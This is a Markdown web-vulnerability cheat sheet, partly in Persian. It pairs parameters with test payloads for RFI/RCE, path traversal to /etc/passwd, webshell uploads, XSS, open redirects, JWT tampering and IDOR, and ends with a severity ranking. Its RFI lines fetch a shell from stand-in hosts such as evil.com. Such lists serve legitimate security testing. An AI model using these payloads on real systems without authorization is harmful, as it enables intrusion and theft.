# Web Vulnerabilities – Parameters & Payloads

## 🔴 RFI / RCE Hint

| Parameter | Example URL | Payload |
|---------|-------------|---------|
| page | /index.php?page= | http://evil.com/shell.txt |
| file | /load.php?file= | ../../../../etc/passwd |
| template | /view?template= | php://filter/convert.base64-encode/resource=index.php |
| cmd | /exec?cmd= | id |

---

## 🔴 Hardcoded Credentials

| Location | Example URL | Payload |
|--------|-------------|---------|
| config | /config.js | open directly |
| env | /.env | open directly |
| settings | /settings.yml | open directly |
| js files | /app.js | search: api_key / secret |

---

## 🔴 JWT / API Keys Leak

| Parameter | Example URL | Payload |
|----------|-------------|---------|
| token | /api/user?token= | invalid / empty token |
| Authorization | Header | Bearer null |
| jwt | /auth/me | modify role to admin |
| api_key | /api/data?api_key= | random value |

---

## 🟠 IDOR Candidate

| Parameter | Example URL | Payload |
|----------|-------------|---------|
| id | /api/user?id= | 2 |
| user_id | /profile?user_id= | 1 |
| order_id | /order?order_id= | 999 |
| doc_id | /file?doc_id= | change numeric value |

---

## 🟠 Sensitive Info Leak

| Parameter | Example URL | Payload |
|----------|-------------|---------|
| debug | /app?debug= | true |
| verbose | /api?verbose= | 1 |
| test | /test?mode= | test |
| error | /error | open directly |

---

## 🟠 Upload Endpoint (potential)

| Parameter | Example URL | Payload |
|----------|-------------|---------|
| file | /upload | shell.php.jpg |
| image | /api/upload | shell.php.png |
| avatar | /profile/upload | php webshell |
| document | /docs/upload | .php disguised |

---

## 🟡 DOM XSS Sink

| Parameter | Example URL | Payload |
|----------|-------------|---------|
| query | /search?query= | <script>alert(1)</script> |
| q | /?q= | "><img src=x onerror=alert(1)> |
| msg | /msg?msg= | <svg/onload=alert(1)> |
| text | /view?text= | javascript:alert(1) |

---

## 🟡 Open Redirect (param)

| Parameter | Example URL | Payload |
|----------|-------------|---------|
| url | /redirect?url= | https://evil.com |
| next | /login?next= | //evil.com |
| return | /go?return= | http://evil.com |
| redirect | /out?redirect= | /\/evil.com |

---

## 🟡 WebSocket Endpoint

| Parameter | Example URL | Payload |
|----------|-------------|---------|
| ws | wss://site/ws | connect without auth |
| channel | wss://site/ws?channel= | admin |
| action | ws message | {"action":"admin"} |
| user | ws message | {"user_id":1} |

---

## 🔵 Service / Endpoint Map

| Endpoint | Example URL | Payload |
|---------|-------------|---------|
| swagger | /swagger | open directly |
| api-docs | /v3/api-docs | open directly |
| actuator | /actuator | open directly |
| metrics | /metrics | open directly |


---


اول: اولویت‌بندی آسیب‌پذیری‌ها (از Critical به Low)
اولویت	آسیب‌پذیری
🔴 Critical	RFI / RCE Hint
🔴 Critical	Hardcoded Credentials
🔴 Critical	JWT / API Keys Leak
🟠 High	IDOR Candidate
🟠 High	Sensitive Info Leak
🟠 High	Upload Endpoint (potential)
🟡 Medium	DOM XSS Sink
🟡 Medium	Open Redirect (param)
🟡 Medium	WebSocket Endpoint
🔵 Low / Recon	Service / Endpoint Map
📌 جدول جامع: پارامترها + URL های مشکوک + Payload

فرمت کاملاً استاندارد Markdown
قابل استفاده مستقیم در گزارش یا اسکنر

🔴 RFI / RCE Hint
مورد	مثال
URL مشکوک	/index.php?page=home
پارامتر	page, file, path, template
Payload تست	?page=http://attacker.com/shell.txt
Payload دیگر	?file=../../../../etc/passwd
Payload RCE	?cmd=id
🔴 Hardcoded Credentials
مورد	مثال
URL مشکوک	/config.js, /env, /settings.yml
مسیرها	.env, config.json, settings.py
Payload	مستقیم باز کردن URL
الگو جستجو	password=, api_key=, secret=
🔴 JWT / API Keys Leak
مورد	مثال
URL	/api/user, /auth/me
Header	Authorization: Bearer
Payload	حذف JWT و ارسال درخواست
تست	تغییر sub, role در JWT
نمونه	{"role":"admin"}
🟠 IDOR Candidate
مورد	مثال
URL	/api/user?id=123
پارامتر	id, user_id, order_id
Payload	?id=124
Payload دیگر	?user_id=1
تست	تغییر عدد و مشاهده داده دیگران
🟠 Sensitive Info Leak
مورد	مثال
URL	/debug, /error, /logs
پارامتر	debug=true
Payload	?debug=true
خروجی حساس	Stack Trace, SQL Error
🟠 Upload Endpoint (potential)
مورد	مثال
URL	/upload, /api/upload
پارامتر	file, image
Payload	shell.php.jpg
Content-Type	image/jpeg
تست	آپلود PHP + اجرای آن
🟡 DOM XSS Sink
مورد	مثال
Sink	innerHTML, document.write
پارامتر	query, search, msg
Payload	<script>alert(1)</script>
Payload دیگر	"><img src=x onerror=alert(1)>
🟡 Open Redirect (param)
مورد	مثال
URL	/redirect?url=
پارامتر	url, next, return
Payload	?url=https://evil.com
Payload دیگر	?next=//evil.com
🟡 WebSocket Endpoint
مورد	مثال
URL	wss://site/ws/chat
تست	اتصال بدون auth
Payload	ارسال JSON جعلی
نمونه	{"action":"admin"}
🔵 Service / Endpoint Map
مورد	مثال
URL	/swagger, /v3/api-docs
مسیرها	/actuator, /metrics
Payload	مستقیم باز کردن
هدف	شناسایی API ها
